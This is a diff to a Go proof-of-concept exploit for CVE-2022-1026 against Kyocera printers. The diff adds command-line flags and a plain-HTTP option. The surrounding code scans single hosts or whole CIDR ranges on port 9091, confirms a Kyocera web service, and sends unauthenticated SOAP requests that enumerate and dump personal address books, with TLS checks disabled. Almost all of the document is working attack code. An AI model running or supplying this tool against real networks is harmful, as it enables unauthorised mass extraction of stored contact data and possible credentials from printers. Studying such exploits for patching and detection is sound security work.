@@ -3,11 +3,12 @@
 // poc for CVE-2022-1026
 // usage:
 // go build kygocera.go
-// ./kygocera <IP / URL / IP-Range>
+// ./kygocera <IP / URL / IP-Range)
 // e.g.
-// ./kygocera 192.168.0.0/24
-// ./kygocera printer.mynetwork.local
-// ./kygocera 127.0.0.1 -p 9091 -t 200
+// ./kygocera -h
+// ./kygocera -u 192.168.0.0/24
+// ./kygocera -u printer.mynetwork.local
+// ./kygocera -u 127.0.0.1 -p 9090 -t 200 -n
 package main
 
 import (
@@ -138,8 +139,10 @@ func main() {
 		os.Exit(1)
 	}
 
-	timeoutPtr := flag.Int("timeout", 500, "timeout limit in milliseconds")
-	portPtr := flag.String("port", "9091", "default port 9091/tcp")
+	timeoutPtr := flag.Int("t", 500, "timeout limit in milliseconds")
+	urlPtr := flag.String("u", "", "target: ip, url, cidr")
+	portPtr := flag.String("p", "9091", "port")
+	nosslPtr := flag.Bool("n", false, "ssl off")
 	flag.Parse()
 
 	var hosts []string
@@ -148,22 +151,23 @@ func main() {
 	// if not, it should be an url. then try to resolve
 	// if not able to resolve, look for / in it, then its maybe a range
 	// if error in parsing cidr -> gtfo
-	host := net.ParseIP(os.Args[1])
+	host := net.ParseIP(*urlPtr)
 	if host != nil {
-		hosts = append(hosts, os.Args[1])
+		hosts = append(hosts, *urlPtr)
 	} else {
-		addr, err := net.LookupHost(os.Args[1])
+		addr, err := net.LookupHost(*urlPtr)
 		if err == nil {
 			hosts = append(hosts, addr[0])
 		} else {
-			hosts, err = getHostsFromNetwork(os.Args[1])
+			hosts, err = getHostsFromNetwork(*urlPtr)
 			if err != nil {
-				log.Fatalf("[!] something is wrong with '%s'\n", os.Args[1])
+				log.Fatalf("[!] something is wrong with '%s'\n", *urlPtr)
 			}
 		}
 	}
 
 	banner()
+	fmt.Println("port: ", *portPtr)
 	for _, host := range hosts {
 		target := host + ":" + *portPtr
 		fmt.Printf("[*] trying %s...", target)
@@ -172,19 +176,19 @@ func main() {
 		if err == nil {
 			fmt.Printf("open! checking...")
 			conn.Close()
-			isKyocera, err := checkKyoceraHTTP(target)
+			isKyocera, err := checkKyoceraHTTP(target, *nosslPtr)
 			if err != nil {
 				fmt.Printf("error! %s\n", err)
 			}
 			if isKyocera {
 				fmt.Printf("ok! trying...")
-				id, err := createAddressBookObject(target)
+				id, err := createAddressBookObject(target, *nosslPtr)
 				if err != nil {
 					fmt.Printf("failure\n")
 					//			fmt.Printf("[-] %s error: %s\n", target, err)
 				} else {
 					fmt.Printf("success! (id #%s)\n", id)
-					getAddressBookObject(host+":"+*portPtr, id)
+					getAddressBookObject(target, id, *nosslPtr)
 				}
 			} else {
 				fmt.Printf("no kyocera\n")
@@ -197,8 +201,12 @@ func main() {
 
 }
 
-func checkKyoceraHTTP(target string) (bool, error) {
-	target = "https://" + target
+func checkKyoceraHTTP(target string, nossl bool) (bool, error) {
+	if nossl {
+		target = "http://" + target
+	} else {
+		target = "https://" + target
+	}
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	resp, err := http.Get(target)
 	defer resp.Body.Close()
@@ -217,8 +225,14 @@ func checkKyoceraHTTP(target string) (bool, error) {
 	return false, err
 }
 
-func createAddressBookObject(target string) (id string, err error) {
-	url := fmt.Sprintf("https://%s/ws/km-wsdl/setting/address_book", target)
+func createAddressBookObject(target string, nossl bool) (id string, err error) {
+	if nossl {
+		target = "http://" + target
+	} else {
+		target = "https://" + target
+	}
+
+	url := fmt.Sprintf(target + "/ws/km-wsdl/setting/address_book")
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	client := http.Client{}
 	reqBody := []byte(`<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:create_personal_address_enumerationRequest><ns1:number>25</ns1:number></ns1:create_personal_address_enumerationRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>}`)
@@ -249,12 +263,18 @@ func createAddressBookObject(target string) (id string, err error) {
 
 }
 
-func getAddressBookObject(target, id string) {
-	url := fmt.Sprintf("https://%s/ws/km-wsdl/setting/address_book", target)
+func getAddressBookObject(target, id string, nossl bool) {
+	if nossl {
+		target = "http://" + target
+	} else {
+		target = "https://" + target
+	}
+
+	url := fmt.Sprintf(target + "/ws/km-wsdl/setting/address_book")
+
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	client := http.Client{}
 	reqBody := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:get_personal_address_listRequest><ns1:enumeration>%s</ns1:enumeration></ns1:get_personal_address_listRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>`, id)
-	//reqBody := ioutil.NopCloser(bytes.NewBuffer([]byte(newBody)))
 	req, err := http.NewRequest(http.MethodPost, url, bytes.NewBuffer([]byte(reqBody)))
 	if err != nil {
 		log.Fatalf("[!] could not create request: %s\n", err)
